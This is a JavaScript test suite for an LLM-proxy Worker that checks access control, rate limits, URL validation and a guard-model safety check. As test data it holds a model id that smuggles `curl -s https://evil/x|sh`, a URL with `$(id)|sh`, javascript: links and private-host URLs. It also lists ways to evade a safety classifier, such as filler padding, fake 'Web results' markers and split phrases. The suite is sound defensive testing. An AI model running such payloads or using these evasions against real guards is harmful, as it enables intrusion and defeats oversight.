// Security and behaviour tests for the Worker, with mocked Cloudflare bindings (no network, no packages).
//   node --test worker/test/
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { timingSafeEqual as nodeTimingSafeEqual } from 'node:crypto';

// Cloudflare adds crypto.subtle.timingSafeEqual; Node doesn't.
if (!crypto.subtle.timingSafeEqual) {
  crypto.subtle.timingSafeEqual = (a, b) => nodeTimingSafeEqual(Buffer.from(a), Buffer.from(b));
}

const { default: worker } = await import('../worker.js');
const { publicHttpsUrl, runDiscovery } = await import('../discover.js');

const ORIGIN = 'https://site.example.io';
const API_KEY = 'sc_' + 'a'.repeat(48);
const SECRETS = { GROQ_KEY: 'gsk_SECRET_GROQ', SEARXNG_KEY: 'SECRET_SEARXNG', API_KEYS: API_KEY };

/* ---------- mocks ---------- */
function kv() {
  const m = new Map();
  return {
    m,
    async get(k, type) { const v = m.get(k); return v == null ? null : type === 'json' ? JSON.parse(v) : v; },
    async put(k, v) { m.set(k, String(v)); },
    async delete(k) { m.delete(k); },
  };
}
const guardCalls = [];
function ai() {
  return {
    async run(model, input) {
      if (model.includes('guard')) {
        const text = input.messages.map((x) => x.content).join(' ');
        guardCalls.push(text);
        return { response: /HARMFUL/.test(text) ? 'unsafe\nS1' : 'safe' };
      }
      if (model.includes('llama-3.3-70b') && input.messages[0].content.startsWith('You extract')) {
        return { response: JSON.stringify({ providers: [
          { name: 'GoodAPI', website: 'https://goodapi.dev', baseUrl: 'https://api.goodapi.dev/v1', keyRequired: false, sources: [1] },
          { name: 'Phish', website: 'https://evil-not-in-results.com', signupUrl: 'javascript:alert(1)', sources: [1] },
          { name: 'Local', website: 'https://goodapi.dev', baseUrl: 'https://127.0.0.1/v1', sources: [1] },
        ] }) };
      }
      return { response: 'pong' };
    },
    async models() { return [{ name: '@cf/test/model' }]; },
  };
}
function env(extra = {}) {
  return {
    ALLOWED_ORIGIN: ORIGIN, AI: ai(), DISCOVERY: kv(), SEARXNG_URL: 'https://searx.example', ...SECRETS, ...extra,
  };
}
const fetchLog = [];
globalThis.fetch = async (input, init = {}) => {
  const url = String(input.url || input);
  fetchLog.push({ url, init });
  if (url.startsWith('https://searx.example/search')) {
    return Response.json({ results: [
      { title: 'GoodAPI free LLM API', url: 'https://goodapi.dev/docs', content: 'Free keyless LLM API at goodapi.dev' },
      { title: 'Another page', url: 'https://blog.example.org/free-llm', content: 'A list of free APIs' },
    ] });
  }
  if (url === 'https://api.goodapi.dev/v1/models') return Response.json({ data: [{ id: 'good-chat-1' }] });
  if (url === 'https://api.goodapi.dev/v1/chat/completions') return Response.json({ choices: [{ message: { content: 'pong' } }] });
  return new Response('not found', { status: 404 });
};

let ipCounter = 0;
async function call(path, { method = 'POST', body, origin = ORIGIN, key, headers = {}, e = env(), ip } = {}) {
  const h = { 'Content-Type': 'application/json', 'CF-Connecting-IP': ip || `10.0.0.${++ipCounter}`, ...headers };
  if (origin) h.Origin = origin;
  if (key) h.Authorization = `Bearer ${key}`;
  const req = new Request('https://worker.example' + path, { method, headers: h, body: body === undefined ? undefined : typeof body === 'string' ? body : JSON.stringify(body) });
  const waits = [];
  const res = await worker.fetch(req, e, { waitUntil: (p) => waits.push(p) });
  return { res, waits };
}
const msg = (content) => ({ messages: [{ role: 'user', content }] });

/* ---------- access control ---------- */
test('health is public and never contains secrets', async () => {
  const { res } = await call('/health', { method: 'GET', origin: null });
  assert.equal(res.status, 200);
  const text = await res.text();
  for (const v of Object.values(SECRETS)) assert.ok(!text.includes(v), 'secret leaked in /health');
});

test('other origins, no key and wrong keys are refused', async () => {
  assert.equal((await call('/chat', { body: msg('hi'), origin: 'https://evil.example' })).res.status, 403);
  assert.equal((await call('/chat', { body: msg('hi'), origin: null })).res.status, 403);
  assert.equal((await call('/v1/chat/completions', { body: msg('hi'), origin: null, key: 'sc_wrong' })).res.status, 401);
  const pre = await call('/chat', { method: 'OPTIONS', origin: 'https://evil.example' });
  assert.equal(pre.res.status, 403);
  assert.equal(pre.res.headers.get('Access-Control-Allow-Origin'), null);
});

test('allowed origin and valid key work', async () => {
  const a = await call('/chat', { body: msg('Say pong') });
  assert.equal(a.res.status, 200);
  assert.equal(a.res.headers.get('Access-Control-Allow-Origin'), ORIGIN);
  const b = await call('/v1/chat/completions', { body: msg('Say pong'), origin: null, key: API_KEY });
  assert.equal(b.res.status, 200);
  assert.equal((await b.res.json()).choices[0].message.content, 'pong');
});

test('unknown routes are 404', async () => {
  assert.equal((await call('/admin', { method: 'GET' })).res.status, 404);
  assert.equal((await call('/chat', { method: 'GET' })).res.status, 404);
});

/* ---------- input limits ---------- */
test('oversized, malformed and badly shaped bodies are rejected', async () => {
  assert.equal((await call('/chat', { body: 'x'.repeat(70 * 1024) })).res.status, 413);
  assert.equal((await call('/chat', { body: '{not json' })).res.status, 400);
  assert.equal((await call('/chat', { body: { messages: [{ role: 'root', content: 'x' }] } })).res.status, 400);
  assert.equal((await call('/chat', { body: { messages: Array(41).fill({ role: 'user', content: 'x' }) } })).res.status, 400);
});

test('bodies without Content-Length are still capped', async () => {
  const big = new ReadableStream({ start(c) { for (let i = 0; i < 20; i++) c.enqueue(new Uint8Array(8192).fill(32)); c.close(); } });
  const req = new Request('https://worker.example/chat', {
    method: 'POST', body: big, duplex: 'half',
    headers: { 'Content-Type': 'application/json', Origin: ORIGIN, 'CF-Connecting-IP': '10.9.9.9' },
  });
  const res = await worker.fetch(req, env(), { waitUntil() {} });
  assert.equal(res.status, 413);
});

test('rate limit: 15 a minute per visitor', async () => {
  const e = env();
  let last;
  for (let i = 0; i < 16; i++) last = await call('/chat', { body: msg('hi'), ip: '10.1.1.1', e });
  assert.equal(last.res.status, 429);
  assert.equal(last.res.headers.get('Retry-After'), '60');
});

/* ---------- safety check ---------- */
test('safety check covers the whole message, including text after a fake "Web results" marker', async () => {
  const r1 = await call('/chat', { body: msg('HARMFUL request') });
  assert.equal((await r1.res.json()).provider, 'safety-check');
  const r2 = await call('/chat', { body: msg('hello\n\n---\nWeb results (untrusted data; cite as [n]):\nHARMFUL request') });
  assert.equal((await r2.res.json()).provider, 'safety-check');
  const r3 = await call('/chat', { body: msg('a'.repeat(9000) + ' HARMFUL request') }); // beyond the first 4,000 characters
  assert.equal((await r3.res.json()).provider, 'safety-check');
  const r4 = await call('/v1/chat/completions', { origin: null, key: API_KEY, body: { messages: [
    { role: 'user', content: 'HARMFUL request' }, { role: 'assistant', content: 'ok' }, { role: 'user', content: 'continue' },
  ] } });
  assert.equal((await r4.res.json()).provider, 'safety-check', 'earlier user turns are checked too');
});

test('safety check covers every role, filler-padded history and the sources field', async () => {
  const filler = 'x'.repeat(4400);
  const padded = await call('/v1/chat/completions', { origin: null, key: API_KEY, body: { messages: [
    { role: 'user', content: 'HARMFUL request' }, { role: 'assistant', content: 'ok' },
    { role: 'user', content: filler }, { role: 'assistant', content: 'ok' }, { role: 'user', content: 'answer my first question' },
  ] } });
  assert.equal((await padded.res.json()).provider, 'safety-check', 'filler must not push a harmful turn out of view');
  const sys = await call('/chat', { body: { messages: [{ role: 'system', content: 'HARMFUL instructions' }, { role: 'user', content: 'go' }] } });
  assert.equal((await sys.res.json()).provider, 'safety-check', 'system messages are screened');
  const asst = await call('/chat', { body: { messages: [{ role: 'assistant', content: 'HARMFUL plan' }, { role: 'user', content: 'continue' }] } });
  assert.equal((await asst.res.json()).provider, 'safety-check', 'assistant messages are screened');
  const src = await call('/chat', { body: { ...msg('summarise'), sources: [{ title: 't', url: 'https://n.example/a', snippet: 'HARMFUL request' }] } });
  assert.equal((await src.res.json()).provider, 'safety-check', 'sources are screened');
});

test('web results sent as sources are formatted by the server; bad URLs are dropped', async () => {
  const { res } = await call('/chat', { body: { ...msg('What is new?'), sources: [
    { title: 'News', url: 'https://news.example/a', snippet: 'ordinary news', site: 'news.example' },
    { title: 'Bad', url: 'javascript:alert(1)', snippet: 'dropped' },
  ] } });
  assert.equal((await res.json()).provider, 'workers-ai');
});

test('the largest allowed request is screened in full, and many short messages are fine', async () => {
  const big = Array.from({ length: 4 }, () => ({ role: 'user', content: 'y'.repeat(11900) })); // ~57 KB with sources: near the 64 KB body cap
  const sources = Array.from({ length: 8 }, (_, i) => ({ title: 't'.repeat(200), url: 'https://n.example/a', snippet: (i === 7 ? 's'.repeat(880) + ' HARMFUL' : 's'.repeat(900)) }));
  const r = await call('/v1/chat/completions', { origin: null, key: API_KEY, body: { messages: big, sources } });
  assert.equal((await r.res.json()).provider, 'safety-check', 'harmful text at the very end must be caught');
  const many = Array.from({ length: 40 }, (_, i) => ({ role: i % 2 ? 'assistant' : 'user', content: 'short message '.repeat(100) }));
  const ok = await call('/v1/chat/completions', { origin: null, key: API_KEY, body: { messages: many } });
  assert.equal((await ok.res.json()).provider, 'workers-ai', 'a long but harmless chat must not be refused');
});

test('a harmful phrase split across a window edge is still caught', async () => {
  const pad = 'z'.repeat(3998);
  const r = await call('/chat', { body: msg(pad + 'HARMFUL') }); // "HARMFUL" straddles the 4,000 boundary
  assert.equal((await r.res.json()).provider, 'safety-check');
});

test('a JSON body that is not an object is a 400, not a crash', async () => {
  for (const body of ['null', '[]', '42', '"x"']) {
    assert.equal((await call('/chat', { body })).res.status, 400, body);
    assert.equal((await call('/v1/discover', { body, origin: null, key: API_KEY })).res.status, 400, body);
  }
});

/* ---------- key-only features ---------- */
test('the website cannot use strict mode, unchecked models or provider lists', async () => {
  const a = await call('/chat', { body: { ...msg('hi'), model: 'workers-ai/@cf/unchecked/model', strict: true } });
  assert.equal(a.res.status, 400);
  assert.equal((await call('/v1/provider-models?provider=workers-ai', { method: 'GET' })).res.status, 403);
  const b = await call('/v1/provider-models?provider=workers-ai', { method: 'GET', origin: null, key: API_KEY });
  assert.equal(b.res.status, 200);
});

test('prototype keys like __proto__ never crash the server', async () => {
  for (const id of ['__proto__', 'constructor', 'toString', 'hasOwnProperty']) {
    const r = await call(`/v1/provider-models?provider=${id}`, { method: 'GET', origin: null, key: API_KEY });
    assert.equal(r.res.status, 404, id);
    const c = await call('/v1/chat/completions', { origin: null, key: API_KEY, body: { ...msg('hi'), model: `${id}/x`, strict: true } });
    assert.equal(c.res.status, 400, id);
  }
});

test('JSON responses carry nosniff', async () => {
  const { res } = await call('/health', { method: 'GET', origin: null });
  assert.equal(res.headers.get('X-Content-Type-Options'), 'nosniff');
});

test('keyless auto-tests stop reading huge responses', async () => {
  const { testKeyless } = await import('../discover.js');
  const realFetch = globalThis.fetch;
  globalThis.fetch = async (url) => String(url).endsWith('/models')
    ? new Response(new ReadableStream({ start(c) { for (let i = 0; i < 100; i++) c.enqueue(new Uint8Array(8192).fill(97)); c.close(); } }))
    : realFetch(url);
  try {
    const r = await testKeyless('https://huge.example/v1');
    assert.equal(r.status, 'failed');
    assert.match(r.error, /too large/);
  } finally { globalThis.fetch = realFetch; }
});

test('unknown community providers are refused', async () => {
  const a = await call('/chat', { body: { ...msg('hi'), model: 'community/evil.example/model' } });
  assert.equal(a.res.status, 400);
});

/* ---------- discovery ---------- */
test('publicHttpsUrl refuses anything that is not a public https URL', () => {
  const bad = ['http://x.com', 'https://localhost/v1', 'https://127.0.0.1/v1', 'https://2130706433/', 'https://0x7f.0.0.1/',
    'https://[::1]/', 'https://user:pass@x.com/', 'https://x.com:8443/', 'https://printer.local/', 'https://x.internal/',
    'javascript:alert(1)', 'https://nodot/', 'ftp://x.com/'];
  for (const u of bad) assert.equal(publicHttpsUrl(u), '', u);
  assert.equal(publicHttpsUrl("https://api.groq.com/openai/v1/',"), 'https://api.groq.com/openai/v1');
  for (const u of ['https://localhost./v1', 'https://x.internal./', 'https://printer.local./']) assert.equal(publicHttpsUrl(u), '', u);
  // strict mode (API base URLs, which end up in shell snippets): plain characters only
  assert.equal(publicHttpsUrl('https://a.com/v1;$(id)|sh/x', { strict: true }), '');
  assert.equal(publicHttpsUrl("https://a.com/v1'x", { strict: true }), '');
  assert.equal(publicHttpsUrl('https://api.a.com/v1', { strict: true }), 'https://api.a.com/v1');
  assert.equal(publicHttpsUrl('https://a.com/page?x=1&y=2'), 'https://a.com/page?x=1&y=2', 'normal links keep queries');
  const t = performance.now();
  publicHttpsUrl('https://a.com/' + ')'.repeat(8000) + 'a');
  assert.ok(performance.now() - t < 20, 'trailing-punctuation handling must be linear');
});

test('keyless auto-tests ignore model ids with shell or quote characters', async () => {
  const { testKeyless } = await import('../discover.js');
  const realFetch = globalThis.fetch;
  globalThis.fetch = async (url, init) => {
    if (String(url).endsWith('/models')) return Response.json({ data: [{ id: "llama'; curl -s https://evil/x|sh; '" }, { id: 'good-chat-2' }] });
    return Response.json({ choices: [{ message: { content: 'pong' } }], _model: JSON.parse(init.body).model });
  };
  try {
    const r = await testKeyless('https://api.hostile.example/v1');
    assert.equal(r.status, 'working');
    assert.equal(r.testedModel, 'good-chat-2');
  } finally { globalThis.fetch = realFetch; }
});

test('parallel discovery runs share one run and one budget charge', async () => {
  const e = env();
  let searches = 0;
  let charged = 0;
  const opts = () => ({ force: true, budget: async (n) => { charged += n; return true; }, searchWeb: async () => { searches += 1; await new Promise((r) => setTimeout(r, 5)); return [{ title: 'GoodAPI', url: 'https://goodapi.dev/docs', snippet: 'goodapi.dev free' }]; }, emit() {} });
  await Promise.all(Array.from({ length: 10 }, () => runDiscovery(e, opts())));
  assert.equal(charged, 6, 'only one run may charge the budget');
  assert.equal(searches, 6, 'only one run may search');
  assert.equal(await e.DISCOVERY.get('web:lock'), null);
});

test("a run never deletes another run's lock", async () => {
  const e = env();
  const realPut = e.DISCOVERY.put.bind(e.DISCOVERY);
  let n = 0;
  e.DISCOVERY.put = async (k, v, o) => { await realPut(k, v, o); if (k === 'web:lock' && ++n === 1) await realPut('web:lock', 'someone-else'); };
  const ev = [];
  await runDiscovery(e, { force: true, searchWeb: async () => [], emit: (x) => ev.push(x) });
  assert.equal(await e.DISCOVERY.get('web:lock'), 'someone-else');
  assert.ok(ev.some((x) => /same moment/.test(x.message || '')));
});

test('community replies are size-capped', async () => {
  const e = env();
  await e.DISCOVERY.put('web:latest', JSON.stringify({ at: new Date().toISOString(), providers: [
    { id: 'big.example', name: 'Big', status: 'working', baseUrl: 'https://api.big.example/v1', testedModel: 'm1' },
  ] }));
  const realFetch = globalThis.fetch;
  globalThis.fetch = async (url) => String(url).startsWith('https://api.big.example')
    ? new Response(new ReadableStream({ start(c) { for (let i = 0; i < 400; i++) c.enqueue(new Uint8Array(8192).fill(32)); c.close(); } }))
    : realFetch(url);
  try {
    const r = await call('/v1/chat/completions', { origin: null, key: API_KEY, body: { ...msg('hi'), model: 'community/big.example/m1', strict: true }, e });
    assert.equal(r.res.status, 502);
    assert.match((await r.res.json()).error.message, /too large/);
  } finally { globalThis.fetch = realFetch; }
});

test('discovery keeps only links on domains seen in the results, blocks private hosts, tests keyless APIs', async () => {
  const e = env();
  const events = [];
  const data = await runDiscovery(e, { force: true, searchWeb: async () => (await (await fetch('https://searx.example/search?q=x')).json()).results.map((r) => ({ ...r, snippet: r.content })), emit: (x) => events.push(x) });
  const json = JSON.stringify(data);
  assert.ok(!json.includes('javascript:'), 'javascript: link kept');
  assert.ok(!json.includes('evil-not-in-results.com'), 'domain not in results kept');
  assert.ok(!json.includes('127.0.0.1'), 'private host kept');
  const good = data.providers.find((p) => p.name === 'GoodAPI');
  assert.equal(good.status, 'working');
  assert.ok(!fetchLog.some((f) => f.url.includes('127.0.0.1')), 'a private host was fetched');
  assert.equal(await e.DISCOVERY.get('web:lock'), null, 'lock released');
});

test('discovery respects the 6-hour interval and the daily search budget', async () => {
  const e = env();
  await e.DISCOVERY.put('web:latest', JSON.stringify({ at: new Date().toISOString(), providers: [] }));
  const events = [];
  await runDiscovery(e, { searchWeb: async () => { throw new Error('should not search'); }, emit: (x) => events.push(x) });
  assert.ok(events.some((x) => x.type === 'result' && x.cached));
  const e2 = env();
  const ev2 = [];
  await runDiscovery(e2, { force: true, budget: async () => false, searchWeb: async () => { throw new Error('should not search'); }, emit: (x) => ev2.push(x) });
  assert.ok(ev2.some((x) => /budget/.test(x.message || '')));
});

test('2-hour-old results are reused; 7-hour-old results trigger a new search (6-hour interval)', async () => {
  const at = (h) => new Date(Date.now() - h * 3600e3).toISOString();
  for (const [hours, expectSearch] of [[2, false], [7, true]]) {
    const e = env();
    await e.DISCOVERY.put('web:latest', JSON.stringify({ at: at(hours), providers: [] }));
    let searched = false;
    await runDiscovery(e, { searchWeb: async () => { searched = true; return []; }, emit() {} }).catch(() => {}); // empty search throws; only whether it searched matters
    assert.equal(searched, expectSearch, `${hours} h old`);
  }
  const e = env({ DISCOVERY_INTERVAL_HOURS: '1' });
  await e.DISCOVERY.put('web:latest', JSON.stringify({ at: at(2), providers: [] }));
  let searched = false;
  await runDiscovery(e, { searchWeb: async () => { searched = true; return []; }, emit() {} }).catch(() => {}); // empty search throws; only whether it searched matters
  assert.equal(searched, true, 'the interval is configurable');
});

test('site visitors cannot force a live discovery run', async () => {
  const e = env();
  await e.DISCOVERY.put('web:latest', JSON.stringify({ at: new Date().toISOString(), providers: [] }));
  const { res, waits } = await call('/discover', { body: { force: true }, e });
  const text = await res.text(); // read first: the stream only finishes while someone reads it
  await Promise.all(waits);
  assert.match(text, /"cached":true/);
});

test('working community providers can be chosen, but only their tested model from the website', async () => {
  const e = env();
  await e.DISCOVERY.put('web:latest', JSON.stringify({ at: new Date().toISOString(), providers: [
    { id: 'goodapi.dev', name: 'GoodAPI', status: 'working', baseUrl: 'https://api.goodapi.dev/v1', testedModel: 'good-chat-1' },
  ] }));
  const ok = await call('/chat', { body: { ...msg('hi'), model: 'community/goodapi.dev/good-chat-1' }, e });
  assert.equal((await ok.res.json()).provider, 'community:goodapi.dev');
  const bad = await call('/chat', { body: { ...msg('hi'), model: 'community/goodapi.dev/other-model' }, e });
  assert.equal(bad.res.status, 400);
});

test('daily SearXNG budget stops chat search from calling SearXNG', async () => {
  const e = env({ SEARXNG_DAILY_LIMIT: '1' });
  const before = fetchLog.filter((f) => f.url.startsWith('https://searx.example')).length;
  await call('/search', { body: { q: 'first query' }, e });
  await call('/search', { body: { q: 'second query' }, e });
  const after = fetchLog.filter((f) => f.url.startsWith('https://searx.example')).length;
  assert.equal(after - before, 1, 'second search should be over budget');
  const key = [...e.DISCOVERY.m.keys()].find((k) => k.startsWith('sx:'));
  assert.equal(e.DISCOVERY.m.get(key), '1');
});

test('SearXNG requests carry the key; responses never echo it', async () => {
  const e = env();
  const { res } = await call('/search', { body: { q: 'key check' }, e });
  const text = await res.text();
  assert.ok(!text.includes(SECRETS.SEARXNG_KEY));
  const sx = fetchLog.filter((f) => f.url.startsWith('https://searx.example')).at(-1);
  assert.equal(sx.init.headers['X-Search-Key'], SECRETS.SEARXNG_KEY);
});
